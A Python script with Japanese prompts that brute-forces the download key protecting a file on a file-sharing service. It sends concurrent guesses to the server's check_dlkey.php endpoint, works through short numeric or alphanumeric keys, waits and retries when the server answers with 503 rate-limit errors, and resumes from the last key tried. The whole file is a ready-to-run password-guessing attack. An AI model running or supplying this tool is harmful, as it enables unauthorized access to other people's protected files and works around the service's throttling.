import aiohttp, asyncio
from iter_func import iter_func
from tqdm import tqdm
from time import sleep
from random import randint
async def check_dlkey(url, dlkey, is_zip, pbar):
    _, _, server, file = url.split("/")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url = "https://"+server+"/check_dlkey.php",
                params={
                    "file": file,
                    "dlkey": dlkey,
                    "is_zip": 1 if is_zip else 0,
                }
            ) as response:
                if response.status == 200:
                    json = await response.json()
                    if json["status"] == 0:
                        pbar.write(f"Found: key(?) = {dlkey}")
                        return [0, dlkey]
                    elif json["status"] == 1:
                        return [1, dlkey]
                    elif json["status"] == 2:
                        return [2, dlkey]
                else:
                    if response.status == 503:
                        #tqdm.write(f"503エラーが発生しました。同時実行数を下げることを推奨します。試行していたキー: {dlkey}")
                        return [3, dlkey]
                    #raise Exception(f"HTTPリクエストに失敗 status: {response.status}\n試行していたキー: {dlkey}")
                    raise Exception(f"HTTPリクエストに失敗 status: {response.status}\n試行していたキー: {dlkey}")
    except OSError:
        #raise Exception(f"HTTPリクエストに失敗 status: {response.status}\n試行していたキー: {dlkey}")
        return [2, dlkey]

async def main():
    for i in range(1 if begin_at== None else len(begin_at), 5):
        print(f"探索開始: {i}文字")
        ite = iter_func(lambda x: x, "?"*i, base_str, begin_at=(None if begin_at == None else begin_at if len(begin_at) == i else None))
        total = ite.__len__()
        with tqdm(total=total) as pbar:
            while True:
                try:
                    tmpl = []
                    for _ in range(nump): tmpl.append(next(ite))
                    tasks = [check_dlkey(url, s, is_zip, pbar) for s in tmpl]
                    res = await asyncio.gather(*tasks)
                    for r in res:
                        if r[0] == 0:
                            return True
                        elif r[0] in [2 , 3]:
                            if r[0] == 3: sleep(0.05)
                            if (res := await check_dlkey(url, r[1], is_zip, pbar))[0] in [2, 3]: raise RuntimeError("2回連続で失敗しました"+("(503)" if res[0] == 3 else "(まとめてかの指定を間違えている？)")+f" 試行していたキー: {r[1]}")
                            elif res[0] == 0: return True
                        pbar.update(1)
                except StopIteration:
                    if len(tmpl) != 0:
                        tasks = [check_dlkey(url, s, is_zip, pbar) for s in tmpl]
                        res = await asyncio.gather(*tasks)
                        for r in res:
                            if r[0] == 0:
                                return True
                            elif r[0] in [2 , 3]:
                                if r[0] == 3: sleep(0.05)
                                if (res := await check_dlkey(url, r[1], is_zip, pbar))[0] in [2, 3]: raise RuntimeError("2回連続で失敗しました"+("(503)" if res[0] == 3 else "(まとめてかの指定を間違えている？)")+f" 試行していたキー: {r[1]}")
                                elif res[0] == 0: return True
                            pbar.update(1)
                    break
    return False

url = input("URLを入力してください(短縮URLはエラー吐きます): ")
print(f"URL: {url}\n")
is_zip = input("zip(まとめてダウンロード)?初期値n (y/n): ").lower() == "y"
print("")
nump = 2
try:
    nump = int(input(f"同時実行数を入力してください。\n503が頻発する場合この値を下げることをおすすめします。初期値{nump}: "))
except ValueError:
    pass
print("")
base_str = "abcdefghijklmnopqrstuvwxyz"
base_str += base_str.upper() + "0123456789"
if input("数字のみ探索しますか?\n英字を探索しない代わりに、探索にかかる時間が約1/1478になります。\n初期値y (y/n): ").lower() != "n": base_str = "0123456789"
print("")
begin_at = input("前回エラー終了した場合は、\nここで前回最後に試行していたキーを入力してください。: ")
print("")
if len(begin_at)==0: begin_at=None

roop = True
while roop:
    roop = False
    try:
        result = asyncio.run(main())
    except RuntimeError as e:
        roop = True
        print(e)
        if "503" in str(e):
            print("503エラーが発生しました。30秒+α待機します。")
            sleep(30+randint(1, 4)) #多分30秒くらい待たないとまた503吐かれる
        print(f'{ str(e).split(" ")[2] }から再試行を開始します...')
        begin_at = str(e).split(" ")[2]
if result: print("探索に成功しました。")
else: print("全てのキーを試行しましたが、正しいキーが見つかりませんでした。")
